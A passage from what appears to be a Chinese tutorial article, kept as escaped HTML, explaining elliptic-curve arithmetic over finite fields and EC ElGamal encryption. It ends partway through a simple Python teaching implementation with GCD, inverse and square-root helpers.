p)`&lt;/li&gt;&lt;li&gt;Fp的乘法单位元为1，零元为0&lt;/li&gt;&lt;li&gt;Fp域上满足交换律，结合律，分配律&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在这个域上我们希望使用椭圆曲线构造加密函数，但是考虑到曲线本身是连续的，不适合做加密，因此我们得想办法在椭圆曲线上构造一种离散的运算。这是我们可以构造一个阿贝尔群：&lt;/p&gt;&lt;p&gt;给定曲线&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-10bc4913a141c3a5a8444b7e87069b7c_b.png&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;150&quot; data-rawheight=&quot;39&quot; class=&quot;content_image&quot; width=&quot;150&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-10bc4913a141c3a5a8444b7e87069b7c_b.png&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;150&quot; data-rawheight=&quot;39&quot; class=&quot;content_image lazy&quot; width=&quot;150&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-10bc4913a141c3a5a8444b7e87069b7c_b.png&quot;/&gt;&lt;/figure&gt;&lt;p&gt;P，Q为曲线上的点，我们规定加法：&lt;/p&gt;&lt;p&gt;实P + Q = R是曲线上点的加法运算，任意取椭圆曲线上两点P、Q（若P、Q两点重合，则作P点的切线），作直线交于椭圆曲线的另一点R&amp;#39;，过R&amp;#39;做y轴的平行线交于R，定义P+Q=R。这样，加法的和也在椭圆曲线上，并同样具备加法的交换律、结合律:&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-36ef558b5f3572354ae5f3d0c2f603d9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;497&quot; data-rawheight=&quot;415&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;497&quot; data-original=&quot;https://pic2.zhimg.com/v2-36ef558b5f3572354ae5f3d0c2f603d9_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-36ef558b5f3572354ae5f3d0c2f603d9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;497&quot; data-rawheight=&quot;415&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;497&quot; data-original=&quot;https://pic2.zhimg.com/v2-36ef558b5f3572354ae5f3d0c2f603d9_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-36ef558b5f3572354ae5f3d0c2f603d9_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;若P与Q点重合，则求P的切线交曲线的另一点为R‘。若有k个相同的点P相加，如3P = P + P + P&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-18e3bda910608ecc8127eb3b11f72068_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;281&quot; data-rawheight=&quot;291&quot; class=&quot;content_image&quot; width=&quot;281&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-18e3bda910608ecc8127eb3b11f72068_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;281&quot; data-rawheight=&quot;291&quot; class=&quot;content_image lazy&quot; width=&quot;281&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-18e3bda910608ecc8127eb3b11f72068_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;下面我们利用小学二年级就学过的微积分的知识求一下相关方程：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;无穷远点 O∞是零元，有O∞+ O∞= O∞，O∞+P=P&lt;/li&gt;&lt;li&gt;P(x,y)的负元是 (x,-y mod p)= (x,p-y) ，有P+(-P)= O∞&lt;/li&gt;&lt;li&gt;P(x1,y1),Q(x2,y2)的和R(x3,y3) 有如下关系：&lt;/li&gt;&lt;/ul&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;n&quot;&gt;x3&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;≡&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;y3&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;≡&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;这里对等式两边求全微分，即可求出&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;若&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Q&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;则&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;这里&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PQ为不同的点&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，直接计算斜率&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;若&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;≠&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Q&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，则&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;若kP = O ∞ ，那么k就是点P的阶(order)&lt;/p&gt;&lt;blockquote&gt;这个就是上面群里元素的阶的定义&lt;/blockquote&gt;&lt;p&gt;上面这个椭圆曲线上点的加法运算，就构成了一个阿贝尔群，数学基础到此结束。&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;二、ElGamal离散对数密码体制&lt;/b&gt;&lt;/p&gt;&lt;p&gt;我们来介绍一下基于离散对数的加密算法，首先密钥与公钥的生成步骤如下：&lt;/p&gt;&lt;p&gt;&lt;b&gt;（一）公钥密钥生成：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;1. Alice首先构造一条椭圆曲线E，在曲线上选择一点G作为生成元，并求G的阶为n，要求n必须为质数。此时构成了一个循环群\&amp;lt;G&amp;gt;。&lt;/p&gt;&lt;p&gt;2. Alice选择一个私钥k (k &amp;lt; n),生成公钥 Q = kG&lt;/p&gt;&lt;p&gt;3. Alice将公钥组E、Q、G发送给Bob&lt;/p&gt;&lt;p&gt;&lt;b&gt;（二）加密过程&lt;/b&gt;&lt;/p&gt;&lt;p&gt;1、Bob收到信息后，将明纹编码为M，M为曲线上一点，并选择一个随机数r（r &amp;lt; n, n为G的阶）&lt;/p&gt;&lt;p&gt;2、Bob计算点Cipher1与Cipher2即两段密文，计算方法如下&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Cipher1 = M + rQ&lt;/li&gt;&lt;li&gt;Cipher2 = rG&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;3、Bob把Cipher1和Cipher2发给Alice&lt;/p&gt;&lt;p&gt;&lt;b&gt;（三） 解密过程&lt;/b&gt;&lt;/p&gt;&lt;p&gt;1、Alice收到密文后，为了获得M，只需要Cipher1 - k · Cipher2,因为&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;n&quot;&gt;Cipher1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cipher2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;M&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rQ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;krG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;M&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rkG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;krG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;2、将M解码即可&lt;/p&gt;&lt;p&gt;&lt;b&gt;（四）技术要求&lt;/b&gt;&lt;/p&gt;&lt;p&gt;在选择参数时有一下要求：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;大质数p越大安全性越好，但是速度会降低，200位左右可以满足一般安全要求&lt;/li&gt;&lt;li&gt;n应为质数&lt;/li&gt;&lt;li&gt;椭圆曲线上所有点的个数m与n相除的商的整数部分为h，h≤4；p≠n×h ；pt≠1(mod n) (1≤t＜20)&lt;/li&gt;&lt;li&gt;满足椭圆曲线的判别式&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;（五）代码实现&lt;/b&gt;&lt;/p&gt;&lt;p&gt;接下来我们用python写个简单的demo加深一下理解。&lt;/p&gt;&lt;p&gt;解释一下几个基本函数：&lt;/p&gt;&lt;p&gt;这个函数是扩展欧几里得算法，就是我们常说的辗转相除法求出最大公因数后反向带入的过程，返回最大公因数a和满足&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sa + tb = gcd(a,b)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;(这是贝祖等式)的s0和t0。gcd(a, b)函数的功能是求a，b的最大公因数。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# Extended GCD&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;egcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;divmod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;s0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;inv()这个函数实现了求乘法逆元的功能，使用扩展欧几里得算法。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# Get invert element&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;inv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# div on ç a/b mod q as a * inv(b, q) mod q&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# n*inv % q = 1 =&amp;gt; n*inv = q*m + 1 =&amp;gt; n*inv + q*-m = 1&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# =&amp;gt; egcd(n, q) = (inv, -m, 1) =&amp;gt; inv = egcd(n, q)[0] (mod q)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;sqrt()这个函数实现了开平方的算法，需要注意的是这里的乘法运算是有限域上的模乘，因此采用试根的方式。q - i 与 i 构成一对相反数。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# sqrt on PN module: returns two numbers or exception if not exist&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;not found&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;下面我们构造椭圆曲线类EC：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;构造函数中a，b为EC的参数，p为模p有限域的大质数&lt;/li&gt;&lt;li&gt;`is_valid(self, p)`判断点p是否在曲线上&lt;/li&gt;&lt;li&gt;`at(self, x)`，求出党x为横坐标是对应的y值&lt;/li&gt;&lt;li&gt;`neg(self, p)`,求关于x轴对称的点&lt;/li&gt;&lt;li&gt;`add(self, p1, p2)`，求点p1，p2在椭圆曲线上的加法&lt;/li&gt;&lt;li&gt;`mul(self, p, n)`，把p点累加n次&lt;/li&gt;&lt;li&gt;`order(self, g)`，求g点的阶&lt;/li&gt;&lt;/ul&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# System of Elliptic Curve&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;EC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# elliptic curve as: (y**2 = x**3 + a * x + b) mod q&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# - a, b: params of curve formula&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# - p: prime number&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
